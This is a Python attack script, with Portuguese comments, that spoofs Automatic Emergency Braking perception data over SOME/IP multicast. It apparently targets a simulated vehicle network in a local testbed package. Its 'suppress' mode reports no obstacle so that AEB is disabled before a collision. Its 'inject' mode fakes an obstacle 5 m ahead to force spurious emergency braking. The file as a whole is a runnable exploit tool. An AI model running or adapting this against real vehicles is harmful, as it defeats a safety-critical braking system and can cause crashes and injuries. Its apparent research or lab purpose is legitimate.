"""
Spoofing attack — injeta dados AEB/Perception falsos no Service 0x1005.

Dois modos de ataque (--mode):
  suppress  (padrão) — reporta "sem obstáculo" quando há veículo à frente
                        → desativa AEB, potencial colisão
  inject              — reporta "obstáculo a 5 m" continuamente
                        → AEB dispara sem motivo, freio de emergência espúrio

Referência: AUTOSAR AP AEBServiceInterface / ISO 15623
"""

import argparse
import os
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from someip_network.packet import SomeIPPacket
from someip_network import SERVICE_ADAS, METHOD_NOTIFY
from someip_network.services.base import MULTICAST_GROUP, MULTICAST_PORT

# ── Payloads de ataque ────────────────────────────────────────────────────────

_SUPPRESS = {
    'aeb_state':               'INACTIVE',
    'ttc_s':                   None,
    'lead_vehicle_detected':   False,
    'lead_vehicle_distance_m': None,
    'lead_vehicle_speed_kmh':  None,
    'pedestrian_detected':     False,
    'pedestrian_distance_m':   None,
    'traffic_light_detected':  False,
    'lane_departure_warning':  False,
    'emergency_brake_active':  False,
}

_INJECT = {
    'aeb_state':               'FULL_BRAKE',
    'ttc_s':                   0.8,
    'lead_vehicle_detected':   True,
    'lead_vehicle_distance_m': 5.0,
    'lead_vehicle_speed_kmh':  0.0,
    'pedestrian_detected':     False,
    'pedestrian_distance_m':   None,
    'traffic_light_detected':  False,
    'lane_departure_warning':  False,
    'emergency_brake_active':  True,
}


def run(mode: str = 'suppress', rate_hz: int = 25, duration_s: int = 30):
    payload  = _SUPPRESS if mode == 'suppress' else _INJECT
    sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    interval = 1.0 / rate_hz
    deadline = time.time() + duration_s
    session  = 0
    sent     = 0

    print(f'[Spoof-AEB] Modo: {mode.upper()} | {rate_hz} Hz | {duration_s} s')
    print(f'[Spoof-AEB] Payload: {payload}')

    while time.time() < deadline:
        session = (session % 0xFFFF) + 1
        pkt = SomeIPPacket(
            service_id=SERVICE_ADAS,
            method_id=METHOD_NOTIFY,
            session_id=session,
            payload=payload,
        )
        sock.sendto(pkt.encode(), (MULTICAST_GROUP, MULTICAST_PORT))
        sent += 1
        time.sleep(interval)

    sock.close()
    print(f'[Spoof-AEB] Encerrado — {sent} pacotes injetados')


if __name__ == '__main__':
    p = argparse.ArgumentParser(description='AEB Spoofing Attack')
    p.add_argument('--mode',     choices=['suppress', 'inject'], default='suppress',
                   help='suppress=falso negativo (sem obstáculo), inject=falso positivo (freio espúrio)')
    p.add_argument('--rate',     type=int, default=25, help='Taxa de envio em Hz (padrão: 25)')
    p.add_argument('--duration', type=int, default=30, help='Duração em segundos (padrão: 30)')
    args = p.parse_args()
    run(args.mode, args.rate, args.duration)
